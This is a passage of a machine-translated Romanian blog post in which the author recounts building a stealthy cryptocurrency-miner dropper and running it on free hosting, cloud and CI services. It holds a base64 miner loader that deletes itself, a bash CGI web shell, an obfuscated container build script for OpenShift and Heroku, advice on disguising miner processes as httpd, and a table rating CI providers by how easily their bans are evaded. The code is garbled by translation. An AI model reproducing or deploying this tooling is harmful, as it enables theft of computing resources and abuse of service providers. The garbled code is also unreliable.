				<span class="hljs-built_in"> printf</span><span class="hljs-string"> „% s”</span><span class="hljs-string">"<span class="hljs-variable"> $ {BASH_REMATCH [3]}</span>"</span><span class="hljs-built_in"> pauză</span><span class="hljs-keyword">fi</span><span class="hljs-keyword"> Terminat</span> &lt;&lt;&lt;<span class="hljs-string">"<span class="hljs-subst"> $ (printf '% s'<span class="hljs-string">"<span class="hljs-variable"> $ CONFIG</span>"</span> 2&gt;/dev/null)</span>"</span>
}</code></pre><p> Acest lucru ne permite doar să edităm linii simple, pentru intrările cu mai multe linii consideră doar prima linie ... dar este suficient de bună pentru cazul nostru de utilizare.</p><h2 id="runtime"><a class="header-anchor" href="#runtime"> Runtime</a></h2><p> Cum arată timpul nostru de rulare? Avem un proces bash principal care execută bucla principală, apoi subprocesul miner, subprocesul monitorului CPU, dulapul și tunerul. Este aproape o mână.</p><p> Mai întâi vrem să ne asigurăm că, dacă ceva nu merge bine, nu lăsăm mizerie, asta înseamnă că folosim o capcană bash pentru a efectua curățări la terminare</p><pre><code class="bash hljs"><span class="hljs-built_in">trap</span><span class="hljs-string">"trap - SIGINT EXIT SIGKILL SIGTERM; kill -9 \$(jobs -p); cleanup &amp;&gt;/dev/null ; fleep 10"</span> SIGINT EXIT SIGKILL SIGTERM</code></pre><p><code>trap - ...</code>  dezactivează capcana pentru a preveni recurența. Capcana ucide toate locurile de muncă și elimină mediul de lucru.</p><p> Este timpul să porniți minerul, care este stocat ca o variabilă bash în codificarea base64. Îl aruncăm pe sistemul de fișiere, apoi vom arunca configurarea, executăm minerul și eliminăm atât minerul, cât și config. Pe Linux puteți elimina executabilul unui proces care rulează, (pe Windows acest lucru nu este permis).<sup id="fnref:memoryondemand"><a class="fnref" href="#fndef:memoryondemand">[8]</a></sup>  Când minerul rulează, pe sistemul de fișiere există doar un<code>.. /</code>  director cu un<code>b64</code>  link în ea.</p><pre><code class="bash hljs"><span class="hljs-comment">## put a file $1 into a var $2</span><span class="hljs-function"><span class="hljs-title">fileToVar</span></span>(){
    <span class="hljs-built_in">declare</span> -n tmpd=<span class="hljs-string">"<span class="hljs-variable"> 2 USD</span>"</span>  &amp;&amp; tmpd = $ (b64e<span class="hljs-string">"<span class="hljs-variable"> 1 $</span>"</span>) &amp;&amp; <span class="hljs-built_in"> întoarcere</span><span class="hljs-keyword"> dacă</span>  [-z<span class="hljs-string">"<span class="hljs-variable"> $ tmpd</span>"</span> ]; <span class="hljs-keyword"> atunci</span><span class="hljs-built_in"> Buturuga</span><span class="hljs-string">"gobbling in array"</span><span class="hljs-built_in">eval</span><span class="hljs-string">"<span class="hljs-variable"> 2 USD</span> = 1 "</span><span class="hljs-comment"> ## evitați cecurile goale</span> 
        înghițit [<span class="hljs-variable"> 2 USD</span> ] = $ (b64e<span class="hljs-string">"<span class="hljs-variable"> 1 $</span>"</span>)
    <span class="hljs-keyword"> altceva</span><span class="hljs-built_in"> întoarcere</span> 1 <span class="hljs-comment"> ## nu citați misiunea, altfel ram nu este eliberat</span><span class="hljs-keyword">fi</span>
}
<span class="hljs-comment"> ## puneți un var $ 1 într-un fișier $ 2</span><span class="hljs-function"><span class="hljs-title"> varToFile</span></span>(){
    <span class="hljs-keyword"> dacă</span>  [-n<span class="hljs-string">"<span class="hljs-variable"> $ VERBOSE</span>"</span> ]; <span class="hljs-keyword"> atunci</span><span class="hljs-keyword"> dacă</span><span class="hljs-built_in"> declara</span>  -n 2 &gt;&gt;<span class="hljs-variable"> $ {VERBOSE}</span> &amp;&amp; <span class="hljs-built_in">eval</span><span class="hljs-string">"b64d &lt;&lt;&lt;\"\$<span class="hljs-variable"> 1 $</span> \ "1&gt; \"<span class="hljs-variable"> 2 USD</span> \ "2 &gt;&gt;<span class="hljs-variable"> $ {VERBOSE}</span>"</span>; <span class="hljs-keyword"> atunci</span><span class="hljs-built_in"> întoarcere</span><span class="hljs-keyword"> altceva</span><span class="hljs-comment"> # log "dumping din matrice"</span><span class="hljs-built_in">eval</span><span class="hljs-string">"b64d &lt;&lt;&lt;\"\${gobbled[<span class="hljs-variable"> 1 $</span> ]} \ "1&gt; \"<span class="hljs-variable"> 2 USD</span> \ "2 &gt;&gt;<span class="hljs-variable"> $ {VERBOSE}</span>"</span> &amp;&amp; <span class="hljs-built_in"> întoarcere</span><span class="hljs-keyword">fi</span><span class="hljs-built_in"> întoarcere</span> 1
    <span class="hljs-keyword"> altceva</span><span class="hljs-keyword"> dacă</span><span class="hljs-built_in"> declara</span>  -n &amp;&amp;<span class="hljs-built_in">eval</span><span class="hljs-string">"b64d &lt;&lt;&lt;\"\$<span class="hljs-variable"> 1 $</span>\" &gt;\"<span class="hljs-variable"> 2 USD</span>\""</span>; <span class="hljs-keyword"> atunci</span><span class="hljs-built_in"> întoarcere</span><span class="hljs-keyword"> altceva</span><span class="hljs-comment"> # log "dumping din matrice"</span><span class="hljs-built_in">eval</span><span class="hljs-string">"b64d &lt;&lt;&lt;\"\${gobbled[<span class="hljs-variable"> 1 $</span>]}\" &gt;\"<span class="hljs-variable"> 2 USD</span>\""</span> &amp;&amp; <span class="hljs-built_in"> întoarcere</span><span class="hljs-keyword">fi</span><span class="hljs-built_in"> întoarcere</span> 1
    <span class="hljs-keyword">fi</span>
}</code></pre><p>O ciudățenie înnebunitoare întâlnită cu bash în timp ce codifica minerul este aceea că atribuirea unei variabile cu un sub-shell cu ghilimele<code>myvar="$(something)"</code>  provoacă o creștere permanentă a utilizării memoriei, acest lucru a fost greu de depanat și nu am găsit cu adevărat motivul pentru care se comportă așa, oricum atribuirea trebuie să fie necotată. Decodarea se face în schimb cu<em> herestrings</em>  care este o abstracție asupra fișierelor temporare, variabila este aruncată într-un fișier care este apoi readus în proces.</p><p> Bucla de funcționare lungă a minerului:</p><ul><li><p> în timp ce este adevărat</p><ul><li><p> stop miner</p></li><li><p> eliminați config</p></li><li><p> începe miner</p></li><li><p> în timp ce este adevărat</p><ul><li><p> pornește daemon</p><ul><li><p> în timp ce minerul aleargă</p><ul><li><p> citiți rezultatul de la miner</p></li><li><p> alegeți acțiunea minerului pe baza liniei de ieșire</p></li></ul></li></ul></li><li><p> dacă minerul nu aleargă: rupeți</p></li></ul></li><li><p> dormi</p></li></ul></li></ul><p> Linia de ieșire este potrivită cu unele regex:</p><pre><code class="bash hljs">act_rgx=<span class="hljs-string">'(accepted|speed|paused|algo:|-&gt; update config|-&gt; publish config|-&gt; trigger restart|\[CC\-Client\] error|Error: \"\[Connect\]|POOL #1:      \(null\))|not enough memory|self-test failed|read error|cpu  disabled'</span></code></pre><p> Demonul gestionează cazurile în care</p><ul><li><p> conexiunea la punctul final dă erori (alegeți un punct final nou aleatoriu)</p></li><li><p> algoritmul de hash se modifică (reglați timpul de somn și configurațiile ad-hoc)</p></li><li><p> probleme de miner (reporniți minerul).</p></li></ul><p> Pentru o vreme, a existat suport pentru tabloul de bord de comandă și control, care a permis declanșarea repornirilor manuale, totuși, deoarece utilizarea sa a fost minimă, a fost eliminată, iar punctele sale finale au fost înlocuite cu o conexiune alternativă la piscină, de asemenea procesul de repornire a fost instabil, complex. ..un alt caz de datorie tehnologică. Cu toate acestea, a permis să recuperăm o sarcină utilă actualizată și să re-configurăm toate configurațiile din mers, ceea ce a fost destul de cool, trambulina supremă.</p><h2 id="debugging"><a class="header-anchor" href="#debugging"> Depanare</a></h2><p> Există trei utilități principale</p><ul><li><p> activați / dezactivați urmărirea în jurul blocurilor de cod (nu vrem să urmăriți un cod binar codat b64 într-o variabilă ..)</p></li><li><p> o funcție simplă pentru formatarea jurnalelor</p></li><li><p>un steag care ar activa înregistrarea detaliată la rulare ori de câte ori a fost pornit minerul.</p><ul><li><p> face fișierul<code>.debug</code>  exista?</p><ul><li><p> activați înregistrarea detaliată</p></li></ul></li></ul></li></ul><h2 id="target_deployments"><a class="header-anchor" href="#target_deployments"> Implementări vizate</a></h2><p> Această configurație a fost testată pe 3 tipuri de gazde:</p><h3 id="self_hosted_containers_or_vms"><a class="header-anchor" href="#self_hosted_containers_or_vms"> Containere sau VM-uri găzduite automat</a></h3><p> Mulți furnizori de găzduire nu le plac mineritul, deoarece resursele CPU tind să fie partajate între mai mulți utilizatori, iar software-ul de minerit poate încetini cu ușurință un nod gazdă care afectează performanța pentru restul utilizatorilor. Acest lucru poate fi adevărat chiar dacă timpul de utilizare a procesorului este nelimitat, deoarece algoritmii de hash pot satura toate straturile de cache ale procesorului dacă memoria cache este partajată între toate nucleele procesorului.</p><p> Ne-ar plăcea să ne folosim<em> corect</em>  cota de resurse fără a fi interzisă, acesta este un bun caz de utilizare pentru piciorul nostru stealth, deoarece este conștient de utilizarea gazdei, ceea ce înseamnă că<em> ar trebui să</em>  rămâneți cam în [AUP]. Nu există pași suplimentari atunci când se ocupă de implementări găzduite de sine, ci doar scriptul de lansare, poate adăugat la secvența de boot sau lansat manual.</p><h3 id="cpanel_based_web_hosting"><a class="header-anchor" href="#cpanel_based_web_hosting"> Gazduire web bazata pe cPanel</a></h3><p> Planurile de abonamente de găzduire web sunt oferite în principal prin [cPanel]. Din nou aici, folosim planuri personale de abonament care au limite rezonabile de resurse, pe de altă parte, orice plan gratuit are limite ridicole<sup id="fnref:freehostinglimits"><a class="fnref" href="#fndef:freehostinglimits">[9]</a></sup> . cPanel vă permite să definiți handlerele pentru diferite extensii de fișiere, acest lucru ne permite să executăm scripturi shell prin intermediul<a href="https://en.wikipedia.org/wiki/Common_Gateway_Interface"> cgi</a>  cu o cerere http împotriva unui script shell încărcat pe server. Acest tip de interfețe sunt cum arată web-shell-urile<sup id="fnref:cpanelssh"><a class="fnref" href="#fndef:cpanelssh">[10]</a></sup> . Un simplu shell web bash</p><pre><code class="bash hljs"><span class="hljs-comment"># without content encoding the request response won't be honored</span><span class="hljs-built_in">echo</span> -e <span class="hljs-string">'Content-Type: text/plain\n'</span>
SERVER_NAME=myserver
<span class="hljs-comment">## parse vars (for interactive use)</span>
saveIFS=<span class="hljs-variable">$IFS</span>
IFS=<span class="hljs-string">'=&amp;'</span>
parm=(<span class="hljs-variable">$QUERY_STRING</span>)
IFS=<span class="hljs-variable">$saveIFS</span><span class="hljs-keyword">for</span> ((i=0; i&lt;<span class="hljs-variable">${#parm[@]}</span>; i+=2))
<span class="hljs-keyword">do</span><span class="hljs-built_in">declare</span> var_<span class="hljs-variable">${parm[i]}</span>=<span class="hljs-variable">${parm[i+1]}</span><span class="hljs-keyword">done</span><span class="hljs-comment">## exec command for interactive and proclimited scenarios</span>
url_encoded=<span class="hljs-string">"<span class="hljs-variable"> $ {var_path // + /}</span>"</span><span class="hljs-built_in"> export</span>  CALEA =<span class="hljs-string">".:<span class="hljs-variable"> $ PATH</span>"</span> 
. /dev/shm/srv/utils/load.env &amp;&gt; / dev / null

<span class="hljs-keyword"> dacă</span><span class="hljs-built_in"> declara</span>  -f<span class="hljs-string">"<span class="hljs-variable"> $ {url_encoded / \% 20 *}</span>"</span> 1&gt;/dev/null; <span class="hljs-keyword"> atunci</span><span class="hljs-comment"> ## nu utilizați -n, redirecționați fd pentru bcompat</span><span class="hljs-built_in"> printf</span><span class="hljs-string"> „% b”</span><span class="hljs-string">"<span class="hljs-variable"> $ {url_encoded //% / \\ x}</span>"</span>  &gt; / tmp /<span class="hljs-variable"> $ {SERVER_NAME}</span> .src
<span class="hljs-keyword"> altceva</span><span class="hljs-keyword"> dacă</span><span class="hljs-built_in"> incorporat</span><span class="hljs-string">"<span class="hljs-variable"> $ {url_encoded / \% 20 *}</span>"</span>; <span class="hljs-keyword"> atunci</span><span class="hljs-built_in"> printf</span><span class="hljs-string"> „% b”</span><span class="hljs-string">"<span class="hljs-variable"> $ {url_encoded //% / \\ x}</span>"</span>  &gt; / tmp /<span class="hljs-variable"> $ {SERVER_NAME}</span> .src
    <span class="hljs-keyword"> altceva</span><span class="hljs-built_in"> printf</span><span class="hljs-string"> „execut% b”</span><span class="hljs-string">"<span class="hljs-variable"> $ {url_encoded //% / \\ x}</span>"</span>  &gt; / tmp /<span class="hljs-variable"> $ {SERVER_NAME}</span> .src
    <span class="hljs-keyword">fi</span><span class="hljs-keyword">fi</span> 
. / tmp /<span class="hljs-variable"> $ {SERVER_NAME}</span> .src</code></pre><p> Este mai bine să vă bazați doar pe elementele încorporate, deoarece forțarea proceselor suplimentare nu poate fi permisă în închisorile web, dar este întotdeauna posibil să<code>exec</code>  ceea ce ne permite să folosim majoritatea utilitarelor din linia de comandă. Majoritatea shell-urilor web sunt scrise în alte limbaje de scriptare, cum ar fi python sau php, deoarece nu trebuie să vă faceți griji cu privire la bifurcare.</p><p> Într-un mediu cpanel este mai bine să utilizați un nume static pentru procesul miner, cum ar fi<code>httpd</code>  sau<code>php-fpm</code>  deoarece<code>cgi</code>  se bazează pe procesare multiplă, astfel încât serverele sunt întotdeauna umplute cu multe procese denumite astfel, deși un observator atent ar trebui să observe<em> multi-threaded</em>  model de utilizare care cu siguranță nu este comun (sau posibil) pentru limbi precum perl, php, ruby ​​sau python!</p><p> Procesele au, de asemenea, o limită de timp în mod implicit (1 oră, 1 zi, etc.), pentru aceasta folosim doar o lucrare cron care repornește picătorul.</p><p> Acest lucru a necesitat o mulțime de editare manuală, API-ul cpanel pentru a automatiza acest lucru, din păcate, nu este expus utilizatorilor finali, astfel încât găzduirea web este o țintă plictisitoare și plictisitoare pentru dropper-ul nostru de mineri.</p><h3 id="web_environments"><a class="header-anchor" href="#web_environments"> Medii web</a></h3><p> Sunt<em> SaaS</em>  furnizorii care au un editor web cuplat cu un container, cum ar fi<a href="with a free tier before getting acquired by amazon"> cloud9</a> , [codeanywhere], [codenvy]. Implementarea picuratorului aici este ușoară (aveți un mediu deplin), dar menținerea acestuia în funcțiune este o povară, deoarece orice editor web interactiv își termină sesiunea imediat după închiderea paginii web și, prin urmare, containerul este adormit (cu excepția cazului în care plateste desigur).</p><p>Eludarea acestui lucru poate însemna doar că trebuie să menținem sesiunile deschise, unele scripturi cu [păpușar] au obținut rezultatul dorit, dar a avea o perioadă lungă de funcționare, scurgeri de memorie, pagini web spa SPA umflate este cu siguranță neatractiv și nu stealth, deoarece din backend-ul furnizorului, o sesiune deschisă 24/7 va părea cu siguranță suspectă. Într-adevăr, mediile web sunt, de asemenea, ținte ciudate și plictisitoare.</p><h3 id="free_apps_services"><a class="header-anchor" href="#free_apps_services"> Servicii gratuite de aplicații</a></h3><p> Aceasta este în principal<a href="when it used to have a free tier"> openhift</a><sup id="fnref:openshift"><a class="fnref" href="#fndef:openshift">[11]</a></sup>  și [heroku]. Openshift, fiind kubernetes a fost oarecum ușor de implementat, dar plin de configurație, aici este un extras:</p><pre><code class="sh hljs"><span class="hljs-built_in">export</span> PATH=.:<span class="hljs-variable">$PATH</span>

[ -z <span class="hljs-string">"<span class="hljs-variable"> $ OC_PRJ</span>"</span> ] &amp;&amp; { <span class="hljs-built_in"> ecou</span><span class="hljs-string">"no account data provided"</span>; <span class="hljs-built_in"> Ieșire</span> 1; }
obfs=~/utils/deploy/obfs.sh
[ -x <span class="hljs-variable"> $ obfs</span> ] ||
    { <span class="hljs-built_in"> ecou</span><span class="hljs-string">"obfs utility not found!"</span>; <span class="hljs-built_in"> Ieșire</span> 1; }
launcher=~/launcher
[ -f <span class="hljs-variable"> $ lansator</span> ] ||
    { <span class="hljs-built_in"> ecou</span><span class="hljs-string">"launcher script not found!"</span>; <span class="hljs-built_in"> Ieșire</span> 1; }

ctroot=<span class="hljs-variable"> $ {CT_ROOT_DIR: -oc-ct-box-mine}</span><span class="hljs-comment"> ## serviciul care pornește minerul este denumit aplicație în /etc/services.d în rootfs</span> 
scriptpath =<span class="hljs-string">"rootfs/etc/services.d/app/run"</span> 
TIP =<span class="hljs-variable"> $ {HRK_TYPE: -worker}</span> 
IMG = $ (oc-endpoint) /<span class="hljs-variable"> $ OC_PRJ</span>/<span class="hljs-variable"> $ OC_APP</span> 
tspath = / tmp / oc-tmp-apprun
prepend =<span class="hljs-string">"#!/usr/bin/with-contenv bash
"</span><span class="hljs-comment"> ## ai grijă la noua linie ^^^</span><span class="hljs-built_in"> CD</span><span class="hljs-variable"> $ ctroot</span> || { <span class="hljs-built_in"> ecou</span><span class="hljs-string">"couldn't find ct build directory"</span>; <span class="hljs-built_in"> Ieșire</span> 1; }

VARS=$(cat vars) || { <span class="hljs-built_in"> ecou</span><span class="hljs-string"> „fișierul Var este gol!”</span> ; }
VARS =<span class="hljs-variable"> $ {VARS // $ '\ n' /}</span> 
VARS =<span class="hljs-variable"> $ {VARS // \\ / \\\\}</span><span class="hljs-comment"> ## conservă evadările</span> 
script = $ (cat<span class="hljs-variable"> $ lansator</span>  | coada +2 | sed -r<span class="hljs-string"> '/ ^ echo "export \\ $ / a'</span><span class="hljs-string">"<span class="hljs-variable"> $ VARS</span>"</span><span class="hljs-string">' \\'</span> )
pisică &lt;&lt;&lt;<span class="hljs-string">"<span class="hljs-variable"> $ script</span>"</span> &gt; <span class="hljs-variable"> $ tspath</span><span class="hljs-variable"> $ obfs</span><span class="hljs-variable"> $ tspath</span> 
[-z<span class="hljs-string">"<span class="hljs-variable"> $ {tspath}</span> .obfs "</span> ] &amp;&amp; { <span class="hljs-built_in"> ecou</span><span class="hljs-string">"obfs file not found?"</span>; <span class="hljs-built_in"> Ieșire</span> 1; }
cat &lt;&lt;&lt; <span class="hljs-string">"$prepend<span class="hljs-subst"> $ (cat<span class="hljs-string">"<span class="hljs-variable"> $ {tspath}</span> .obfs "</span>)</span>"</span> &gt; <span class="hljs-variable"> $ scriptpath</span><span class="hljs-built_in"> exec</span>  însuși (ar trebui<span class="hljs-built_in">eval</span> )
chmod + x<span class="hljs-variable"> $ scriptpath</span> 

docker build -t<span class="hljs-variable"> $ IMG</span>  . || <span class="hljs-built_in"> Ieșire</span> 1
<span class="hljs-built_in"> CD</span>  -
oc-push-image<span class="hljs-string">"<span class="hljs-variable"> $ IMG</span>"</span></code></pre><p> Acesta a fost scriptul folosit pentru a construi containerul de minerit care a necesitat un șablon yaml:</p><pre><code class="yaml hljs"><span class="hljs-attr">apiVersion:</span><span class="hljs-string">build.openshift.io/v1</span><span class="hljs-attr">kind:</span><span class="hljs-string">BuildConfig</span><span class="hljs-attr">metadata:</span><span class="hljs-attr">labels:</span><span class="hljs-attr">build:</span><span class="hljs-string">${OC_APP}</span><span class="hljs-attr">name:</span><span class="hljs-string">${OC_APP}</span><span class="hljs-attr">spec:</span><span class="hljs-attr">activeDeadlineSeconds:</span><span class="hljs-number">5184000</span><span class="hljs-attr">failedBuildsHistoryLimit:</span><span class="hljs-number">0</span><span class="hljs-attr">successfulBuildsHistoryLimit:</span><span class="hljs-number">0</span><span class="hljs-attr">resources:</span><span class="hljs-attr">limits:</span><span class="hljs-attr">cpu:</span><span class="hljs-number">2</span><span class="hljs-attr">memory:</span><span class="hljs-string">1Gi</span><span class="hljs-attr">runPolicy:</span><span class="hljs-string">Serial</span><span class="hljs-attr">source:</span><span class="hljs-attr">type:</span><span class="hljs-string">Binary</span><span class="hljs-attr">strategy:</span><span class="hljs-attr">sourceStrategy:</span><span class="hljs-attr">from:</span><span class="hljs-attr">kind:</span><span class="hljs-string">ImageStreamTag</span><span class="hljs-attr">name:</span><span class="hljs-string">${OC_APP}-build:latest</span><span class="hljs-attr">namespace:</span><span class="hljs-string">${OC_PRJ}</span><span class="hljs-attr">type:</span><span class="hljs-string">Source</span><span class="hljs-attr">template:</span><span class="hljs-attr">activeDeadlineSeconds:</span><span class="hljs-number">2400</span><span class="hljs-attr">triggers:</span><span class="hljs-bullet">-</span><span class="hljs-attr">generic:</span><span class="hljs-attr">secretReference:</span><span class="hljs-attr">name:</span><span class="hljs-string">${OC_APP}</span><span class="hljs-attr">type:</span><span class="hljs-string">Generic</span></code></pre><p> Dar întregul proces a presupus destul de mulți pași!</p><pre><code class="sh hljs"><span class="hljs-comment">## init</span>
[ -z <span class="hljs-string">"<span class="hljs-variable"> $ OC_APP</span>"</span> ] &amp;&amp; <span class="hljs-built_in"> export</span>  $ (&lt;$ (tfi))
[-z<span class="hljs-string">"<span class="hljs-variable"> $ OC_APP</span>"</span>  ] &amp;&amp; {. ./choose-creds ||<span class="hljs-built_in"> Ieșire</span> 1; }
oc-login
oc new-project <span class="hljs-variable"> $ OC_PRJ</span>  || {[-z<span class="hljs-string">"<span class="hljs-subst"> $ (oc obține proiecte)</span>"</span> ] &amp;&amp; <span class="hljs-built_in"> Ieșire</span> 1; }
oc new-app <span class="hljs-variable"> $ OC_APP</span>  --allow-missing-images ||<span class="hljs-built_in"> Ieșire</span> 1

<span class="hljs-comment"> ## construiți cutia cu docker și împingeți</span><span class="hljs-comment"> # oc-docker-login || ieșirea 1</span> 
oc-build-mine ||<span class="hljs-built_in"> Ieșire</span> 1

<span class="hljs-comment"> ## creați config</span><span class="hljs-built_in"> export</span>  OC_TEMPLATE_TYPE = a mea
oc-box-template ||<span class="hljs-built_in"> Ieșire</span> 1
rtr=0
<span class="hljs-keyword"> in timp ce</span> [ <span class="hljs-variable">$ rtr</span>  -lt 10];<span class="hljs-keyword"> do</span> 
  lansarea oc mai târziu<span class="hljs-variable"> $ OC_APP</span> &amp;&amp; <span class="hljs-built_in"> pauză</span> 
  rtr = $ ((rtr +<span class="hljs-number">1</span>))
  <span class="hljs-built_in"> citit</span>  -t 1
<span class="hljs-keyword"> Terminat</span><span class="hljs-built_in"> Ieșire</span><span class="hljs-comment"> ## construiește</span> 
bash -x oc-build-build ||<span class="hljs-built_in"> Ieșire</span> 1
bash -x oc-build-template || <span class="hljs-built_in"> Ieșire</span> 1
oc start-build <span class="hljs-variable"> $ OC_APP</span> || <span class="hljs-built_in"> Ieșire</span> 1

accounts=<span class="hljs-variable"> $ {ACCOUNTS_DIR: -accounts_queue}</span> 
mv<span class="hljs-variable"> $ conturi</span>/<span class="hljs-variable"> $ {OC_USR}</span> {\ .aceasta, \. $ (data +% s)}</code></pre><p> În pseudo cod:</p><ul><li><p> creați proiectul</p></li><li><p> creați aplicația fără o imagine</p></li><li><p> construiți containerul minier</p></li><li><p> implementați containerul cu o configurare de implementare (abstracție kubernetes)</p></li><li><p> lansarea implementării</p></li></ul><p> The<code>build-build</code>  scripturile au creat în schimb un<em> construi</em>  container care ar fi exploatat câteva ore la rând. Build-urile și podurile normale au resurse separate în openhift, așa că le-am exploatat pe amândouă. Openshift a fost, în general, o experiență proastă, deoarece a trecut peste 4 versiuni diferite (poate mai multe, am oprit urmărirea după un timp) și fiecare dintre ele a necesitat modificări la configurații, nu aveau căi de actualizare și totul a fost repetat iterat și era obișnuit pentru ca construcțiile / păstăile să se blocheze și să nu fie colectate gunoiul ... de obicei, se executau reporniri manuale din când în când, poate kubernetes era doar un buggy :)</p><p> Configurarea Heroku a fost puțin mai simplă (nu implică kubernetes). În afară de construcția containerului, care a fost similară cu cea openhift, restul au fost doar două comenzi cli</p><pre><code class="bash hljs">heroku config:<span class="hljs-built_in">set</span> HRK_APP=<span class="hljs-variable">$HRK_APP</span> -a <span class="hljs-variable">$HRK_APP</span>
heroku container:release -a <span class="hljs-variable">$HRK_APP</span><span class="hljs-variable">$TYPE</span></code></pre><p> Containerul a fost împins direct cu docker în registrul heroku.<sup id="fnref:herokucontainers"><a class="fnref" href="#fndef:herokucontainers">[12]</a></sup>  Fricțiunea cu heroku (care nivel gratuit este încă în picioare până la momentul scrierii) este că dynos poate rula doar 22 de zile pe lună, astfel încât au necesitat o gestionare manuală în fiecare lună, din nou greoaie și plictisitoare. Au executat câteva valuri de interdicție la început și apoi au dezactivat înregistrările prin TOR, sunt destul de sigur că am fost cauza acestui lucru.</p><h3 id="ci_containers_or_vms"><a class="header-anchor" href="#ci_containers_or_vms"> Containere CI sau VM-uri</a></h3><p>Acestea au fost cele mai sinergice ținte pentru picătorul nostru. Există multe<a href="https://en.wikipedia.org/wiki/Continuous_integration"> CI</a>  companii, dintre care multe arde bani investitorilor, oferind niveluri gratuite în speranța de a colecta o parte din piață în afacerea cu infrastructura tehnologică.</p><p> Toate aceste servicii oferă resurse diferite, au cerințe de configurație diferite și rulează în medii diferite. Nu m-am gândit niciodată la automatizarea înregistrării contului, deoarece aceste lucruri sunt groaznice de programat, încerc să le evit tot timpul, așa că am suportat înregistrările manuale pentru o vreme, deoarece eram curios ce fel de răspuns anti spam aș primi (și ce diferit de restul!). Puteți ghici câteva lucruri despre gestionarea unei companii din modul în care gestionează spamul:</p><ul><li><p> Efectuează valuri de interzicere? Apoi au politici non stricte, problemele sunt tratate manual și de la caz la caz</p></li><li><p> Necesită verificare prin telefon? Au fost deja abuzați în trecut</p></li><li><p> Răspund la utilizarea intensă a resurselor? Au un buget restrâns</p></li><li><p> Aplică restricții de cont sau interdicții ascunse? Dacă ascund interdicția, ei au sysadmins rău.</p></li></ul><p> Există, de asemenea, o întrebare filosofică: Dacă un serviciu vă permite să abuzați de sistemul lor pentru o lungă perioadă de timp, înseamnă că au o infrastructură de vârf capabilă să gestioneze sarcina sau pur și simplu un control slab asupra sistemului lor? Și trebuie să luați în considerare echilibrul dintre accesibilitate și securitate, un sistem prea sigur poate reduce reținerea utilizatorilor.</p><p> Iată un tabel care prezintă câteva servicii pe care le-am implementat:</p><table><tbody><tr class="header headerLastRow"><th style="text-align: center;"> ci</th><th style="text-align: center;"> configurare</th><th style="text-align: center;"> performanţă</th><th style="text-align: center;"> Interzice ciocanul</th></tr><tr><td style="text-align: center;"> Bitrise</td><td style="color: red; text-align: center;"> rău</td><td style="color: yellow; text-align: center;"> mediu</td><td style="color: yellow; text-align: center;"> mediu</td></tr><tr><td style="text-align: center;"> Travis</td><td style="color: green; text-align: center;"> bun</td><td style="color: yellow; text-align: center;"> mediu</td><td style="color: green; text-align: center;"> bun</td></tr><tr><td style="text-align: center;"> Codificare</td><td style="color: yellow; text-align: center;"> mediu</td><td style="color: red; text-align: center;"> rău</td><td style="color: yellow; text-align: center;"> mediu</td></tr><tr><td style="text-align: center;"> Gitlab</td><td style="color: yellow; text-align: center;"> mediu</td><td style="color: green; text-align: center;"> bun</td><td style="color: green; text-align: center;"> bun</td></tr><tr><td style="text-align: center;">Circleci</td><td style="color: red; text-align: center;"> rău</td><td style="color: green; text-align: center;"> bun</td><td style="color: yellow; text-align: center;"> mediu</td></tr><tr><td style="text-align: center;"> Semafor</td><td style="color: green; text-align: center;"> bun</td><td style="color: green; text-align: center;"> bun</td><td style="color: yellow; text-align: center;"> mediu</td></tr><tr><td style="text-align: center;"> Docher</td><td style="color: yellow; text-align: center;"> mediu</td><td style="color: yellow; text-align: center;"> mediu</td><td style="color: green; text-align: center;"> bun</td></tr><tr><td style="text-align: center;"> Chei</td><td style="color: green; text-align: center;"> bun</td><td style="color: yellow; text-align: center;"> mediu</td><td style="color: yellow; text-align: center;"> mediu</td></tr><tr><td style="text-align: center;"> Codefresh</td><td style="color: red; text-align: center;"> rău</td><td style="color: green; text-align: center;"> bun</td><td style="color: yellow; text-align: center;"> mediu</td></tr><tr><td style="text-align: center;"> Wercker</td><td style="color: yellow; text-align: center;"> mediu</td><td style="color: yellow; text-align: center;"> mediu</td><td style="color: red; text-align: center;"> rău</td></tr><tr><td style="text-align: center;"> Azure-conducte</td><td style="color: yellow; text-align: center;"> mediu</td><td style="color: yellow; text-align: center;"> mediu</td><td style="color: red; text-align: center;"> rău</td></tr><tr><td style="text-align: center;"> Continuu php</td><td style="color: red; text-align: center;"> rău</td><td style="color: yellow; text-align: center;"> mediu</td><td style="color: yellow; text-align: center;"> mediu</td></tr><tr><td style="text-align: center;"> Amice</td><td style="color: red; text-align: center;"> rău</td><td style="color: red; text-align: center;"> rău</td><td style="color: red; text-align: center;"> rău</td></tr><tr><td style="text-align: center;"> Trântor</td><td style="color: red; text-align: center;"> rău</td><td style="color: green; text-align: center;"> bun</td><td style="color: red; text-align: center;"> rău</td></tr><tr><td style="text-align: center;"> Appveyor</td><td style="color: red; text-align: center;"> rău</td><td style="color: yellow; text-align: center;"> mediu</td><td style="color: red; text-align: center;"> rău</td></tr><tr><td style="text-align: center;"> Nevercode</td><td style="color: red; text-align: center;"> rău</td><td style="color: green; text-align: center;"> bun</td><td style="color: yellow; text-align: center;"> mediu</td></tr><tr><td style="text-align: center;"> Zeist / vercel</td><td style="color: red; text-align: center;"> rău</td><td style="color: green; text-align: center;"> bun</td><td style="color: red; text-align: center;"> rău</td></tr></tbody></table><p> În acest context, a<span style="color: green">  bun</span>  configurare înseamnă că nu a durat mult timp pentru a configura un<code>ci</code>  pentru toate procesele de exploatare (cum ar fi toate serviciile care se bazează pe un tablou de bord web în loc de un fișier de puncte din depozit erau o corvoadă), un<span style="color: red">  rău</span><code>ban-hammer</code>  înseamnă că a fost greu să vă înregistrați la serviciu sau că conturile vor fi interzise mai agresiv.</p><p><a href="https://web.archive.org/web/20210222050951/https://www.bitrise.io/"> Bitrise</a>  necesită configurarea unui proiect, pentru a deduce mediul, arhitectura țintă, procesul de execuție și alte lucruri, a fost foarte mult timp să configurați o construcție, astfel încât a obținut un rating prost în configurație.<a href="https://web.archive.org/web/20210310010750/https://continuousphp.com/"> Continuu php</a>, <a href="https://web.archive.org/web/20210322133805/https://buddy.works/"> Amice</a> , [Codefresh] avea, de asemenea, o mulțime de pași manuali de configurare nedeclarativi.</p><p> Servicii precum [Azure-pipelines],<a href="https://web.archive.org/web/20210308202144/https://app.wercker.com/"> Wercker</a>, <a href="https://web.archive.org/web/20210322133805/https://buddy.works/"> Amice</a>  aplică interzicerea conturilor, interzicerea interzisă este proastă, deoarece vă lasă să ghiciți dacă este ceva în neregulă cu configurația dvs. sau nu. Cu unele servicii, puteți ghici motivul interdicției (destul de mult versiunea dvs. a durat prea mult timp sau ați construit de prea multe ori într-o perioadă scurtă), pentru unele altele, cum 